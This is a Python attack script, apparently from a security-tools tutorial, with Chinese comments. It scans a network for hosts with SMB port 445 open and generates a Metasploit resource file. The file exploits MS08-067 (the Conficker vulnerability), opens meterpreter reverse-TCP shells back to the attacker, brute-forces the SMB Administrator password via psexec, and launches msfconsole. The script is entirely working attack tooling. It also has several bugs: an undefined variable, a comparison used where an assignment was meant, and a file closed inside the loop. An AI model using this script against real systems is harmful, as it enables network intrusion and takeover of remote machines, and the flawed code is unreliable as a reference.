import os
import optparse
import sys
import nmap


def findTarget(Hosts):  # 扫描网段范围内开放445端口的主机
    nmScan = nmap.PortScanner()
    nmScan.scan(Hosts, '445')
    targets = []
    for t in nmScan.all_hosts():
        if nmScan[t].has_tcp(445):  # 如果445端口提供了协议
            state = nmScan[t]['tcp'][445]['state']  # 查看445端口的状态
            if state == 'open':
                print
                '[+]Found Target Host:' + t
                targets.append(t)
    return targets  # 返回开放445端口的主机列表


def setupHandler(configFile, lhost, lport):  # 监听被攻击的主机
    configFile.write('use exploit/multi/handler\n')  # 使用
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp \n')  # 设定payload载荷
    configFile.write('set LPORT ' + str(lport) + '\n')  # 设置监听的端口
    configFile.write('set LHOST ' + lhost + '\n')  # 设置监听的主机，也就是我们的主机
    configFile.write('set DisablePayloadHandler 1\n')  # 不重新监听
    configFile.write('exploit  -j  -z\n')  # 监听  j选项是将所有连接的会话保持在后台 -z不与任务进行即时交换


def confickerExploit(configFile, target, lhost, lport):  # 漏洞利用
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')  # 漏洞利用代码
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configFile.write('set RHOST ' + str(target) + '\n')  # 设定参数
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit \n')


def smbBrute(configFile, target, passwdFile, lhost, lport):  # 暴力破解SMB口令
    username = 'Administrator'
    pF = open(passwordFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(target) + '\n')
        configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')


def main():
    configFile = open('meta.rc', 'w')  # 以写入方式打开配置文件
    usage = '[-]Usage %prog -H <RHOSTS> -l/-L <LHOST> [-p/-P <LPORT> -F/-f <password File>]'
    parser = optparse.OptionParser(usage)
    parser.add_option('-H', dest='target', type='string', help='target host')
    parser.add_option('-p', '-P', dest='lport', type='string', help='listen port')
    parser.add_option('-l', '-L', dest='lhost', type='string', help='listen address')
    parser.add_option('-F', '-f', dest='passwdFile', type='string', help='password file')
    (options, args) = parser.parse_args()
    passwdFile = options.passwdFile
    target = options.target
    lport = options.lport
    lhost = options.lhost
    if (target == None) | (lhost == None):
        print
        parser.usage
        exit(0)
    if options.lport == None:
        lport == '2333'
    targets = findTarget(options.target)  # 寻找目标
    setupHandler(configFile, lhost, lport)  # 设置配置文件
    for target in targets:  # 逐个攻击
        confickerExploit(configFile, target, lhost, lport)
        if passwdFile != None:
            smbBrute(configFile, target, passwdFile, lhost, lport)
        configFile.close()
        os.system('msfconsole -r meta.rc')  # 启动metasploit并读取配置文件


if __name__ == '__main__':

    main()
